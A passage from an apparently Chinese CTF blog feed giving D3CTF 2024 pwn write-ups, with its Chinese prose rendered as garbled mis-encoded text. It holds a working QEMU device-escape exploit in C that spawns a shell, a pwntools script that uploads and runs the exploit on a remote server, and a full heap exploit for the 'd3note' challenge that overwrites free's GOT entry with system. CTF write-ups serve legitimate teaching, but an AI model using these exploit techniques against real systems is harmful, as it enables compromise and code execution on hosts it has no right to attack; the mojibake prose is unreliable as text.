class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> port_mem = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>  <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> inl(port_mem + port); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    outl(val, port_mem + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">666</span>); <span class="comment">// dest = 666</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>, <span class="number">0x80</span>);  <span class="comment">// *(_DWORD *)(v8 + 0xA00) = 0x80</span></span><br><span class="line">    pmio_read(<span class="number">8</span>);  <span class="comment">// dword_123B1CC++</span></span><br><span class="line">    <span class="type">uint32_t</span> leak = mmio_read(<span class="number">0x8c</span>);</span><br><span class="line">    <span class="type">uint32_t</span> low_system_addr = <span class="number">0xa610</span> + leak;</span><br><span class="line">    hexx(<span class="string">&quot;low_system_addr&quot;</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x94</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// addr_v7 = system(&quot;sh&quot;) % 0x100;</span></span><br><span class="line">    mmio_write(<span class="number">0x40</span>, <span class="number">0x6873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è„šæœ¬ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;106.14.121.29&#x27;</span>, <span class="number">30537</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;# &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># send_cmd(&#x27;cd /proc/141/net&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¯èƒ½ç”¨äººä¼šé—®ï¼Œåœ¨ <code>qemu</code> ä¸­æ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> ä¸æ˜¯æ— æ³• <code>getsell</code> çš„å—ï¼Œæ‰§è¡Œåä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ã€‚å…¶å®æ˜¯å¯ä»¥ <code>getshell</code> çš„ï¼Œä½†æ˜¯éœ€è¦é€šè¿‡ <code>pwntools</code> è¿æ¥åæ‰å¯ä»¥çœ‹è§å›æ˜¾ï¼Œå…¶æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/04/29/d3ctf2024/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="d3note"><a href="#d3note" class="headerlink" title="d3note"></a>d3note</h2><p>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_4011F2();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = sub_4011F2();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>));</span><br><span class="line">      *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v6) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">6425</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2064</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_4011F2();</span><br><span class="line">      sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v7 + <span class="number">1</span>), *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_4040A0 + <span class="number">4</span> * v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2064</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">276</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_4011F2();</span><br><span class="line">        v8 = sub_4011F2();</span><br><span class="line">        *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v4) = v8;</span><br><span class="line">        *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>((<span class="type">int</span>)v8);</span><br><span class="line">        sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>), v8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1300</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        v5 = sub_4011F2();</span><br><span class="line">        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v5 + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å¯çš„ä¿æŠ¤ï¼š  </p><img src="/2024/04/29/d3ctf2024/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é¢˜ç¬¬ä¸€çœ¼çœ‹ä¸Šå»å°±æ„Ÿè§‰æ˜¯ç»å…¸çš„èœå•é¢˜ï¼Œä½†æ˜¯çœ‹äº†åŠæ³•æ²¡æœ‰å‘ç°å †ä¸Šçš„æ¼æ´ï¼Œåé¢å‘ç°åœ¨è¾“å…¥å †å—ç´¢å¼•æ—¶ç¨‹åºå¹¶æ²¡æœ‰å¯¹è¾“å…¥çš„ç´¢å¼•è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨è´Ÿç´¢å¼•ã€‚ç”±äºæ²¡æœ‰å¼€å¯ <code>PIE</code> ä¸” <code>RELRO</code> çŠ¶æ€ä¸º <code>Partial RELRO</code>ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©åŠ«æŒ <code>free</code> çš„ <code>got</code> è¡¨ä¸º <code>system</code> ç„¶åé‡Šæ”¾æ‰ä¸€ä¸ªå†…å®¹ä¸º <code>sh</code> çš„å †å—æ¥å®ç° <code>getshell</code><br>è¿™é¢˜çš„ä¸€ä¸ªéš¾ç‚¹åœ¨äºå­˜å‚¨å †å—æŒ‡é’ˆçš„åœ°å€éƒ½æ˜¯ä»¥ <code>8</code> ç»“å°¾ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸å¥½æ³„éœ²åœ°å€ï¼Œç»è¿‡é•¿æ—¶é—´çš„æŸ¥æ‰¾æˆ‘æ‰¾åˆ°äº†å¯ä»¥åˆ©ç”¨çš„åœ°å€  </p><img src="/2024/04/29/d3ctf2024/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰€ä»¥æˆ‘é€‰æ‹©ä»¥è¿™é‡Œæ¥æ³„éœ² <code>libc</code> çš„åœ°å€å¹¶ä½œä¸ºè·³æ¿æ¥å®ç°ä¿®æ”¹ <code>free</code> çš„ <code>got</code> è¡¨<br>expï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.103.122.127&#x27;</span>,<span class="number">32244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">got = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">1918624</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc_base:<span class="subst">&#123;libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000029419</span>+libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000fd76d</span>+libc_base</span><br><span class="line">ret = libc_base + <span class="number">0x00000000000275f2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>)+p64(got)</span><br><span class="line">edit(-<span class="number">1460</span>,payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(-<span class="number">2</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å»å¹´çš„ <code>D3CTF</code> æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å’Œæ ¡é˜Ÿç»„é˜Ÿå‚åŠ æ¯”èµ›ï¼Œå½“æ—¶æˆ‘çš„ <code>pwn</code> æ°´å¹³è¿˜åœç•™åœ¨æ ˆæº¢å‡ºé˜¶æ®µï¼Œå®Œå…¨çš„è¢«è¿™ä¸€äº›é¢˜ç›®ç»™éœ‡æ’¼åˆ°äº†ã€‚ä»Šå¹´å†æ¬¡å‚åŠ  <code>D3CTF</code>ï¼Œå‘ç°é¢˜ç›®èƒ½çœ‹æ‡‚äº†ï¼ŒèŠ±ç‚¹æ—¶é—´é¢˜ç›®èƒ½åšå‡ºæ¥äº†ï¼Œçœ‹æ¥è¿™ä¸€å¹´çš„åŠªåŠ›è¿˜æ˜¯æœ‰é‚£ä¹ˆä¸€ä¸¢ä¸¢ä½œç”¨çš„ï¼Œä¸è¿‡è¿˜æ˜¯å¤„äºæ–°æ‰‹é˜¶æ®µï¼Œå¤ªå¼±äº†ï¼Œå“ã€‚æ¯”èµ›æœŸé—´çœŸçš„å¤ªå¿™å¤ªå¤šäº‹æƒ…äº†ï¼Œå¯¼è‡´æ²¡æœ‰ä»€ä¹ˆæ—¶é—´åšé¢˜ã€‚<code>qemu</code> é€ƒé€¸æ‰¾åˆ°æ¼æ´åå‘ç°å·²ç»ç»™ <code>xtx</code> å¸ˆå‚…åšå‡ºæ¥äº†å‘œå‘œå‘œï¼ˆå¤ªå¼ºæ‹‰  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>When ELF notes reveal too much</title>
      <link href="/2024/04/17/notes/"/>
      <url>/2024/04/17/notes/</url>
      
